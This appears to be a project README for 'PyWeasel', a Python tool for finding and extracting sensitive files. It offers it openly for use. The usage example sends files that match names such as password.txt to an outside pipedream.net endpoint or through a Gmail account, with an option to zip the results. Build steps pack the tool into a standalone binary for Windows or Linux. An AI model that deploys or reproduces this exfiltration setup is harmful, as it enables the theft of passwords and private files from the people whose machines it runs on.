<p align="center">
  <img width="460" src="https://i.ibb.co/jy7QPYW/weasel-cartoon-119631-230.png">
</p>

# PyWeasel

PyWeasel is a Python software to help you to find and extract sensitive data.

## Installation

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install PyWeasel.

```bash
python -m pip install pip --upgrade --user
pip install --user pipenv
pipenv install
pipenv shell
```

## Usage

```
Example : /pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path=\"/home/user/\" --interactive=True --email="xxxx@gmail.com" --password="password" --zip=True')

--url
        Url parameter for http server
--input-file
        File with the list of files or extension to search
--search-files
        File extension to find ('txt') or filename to find ('secret.txt')
--contains-text
        Text contains in filename
--path
        Base directory to find files
--interactive
        Launch script interactive
--email
        Gmail email
--password
        Gmail password
--zip
        Zip files found in csv
```

## Compiling
To compile, first add nuitka when you are in `pipenv shell`

```bash
python -m pip install nuitka
```

After this, use command appropriate to your env.

### Windows
```bash
python -m nuitka --onefile --windows-onefile-tempdir pyweasel.py
```

### Linux
```bash
python -m nuitka --onefile pyweasel.py
```


## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.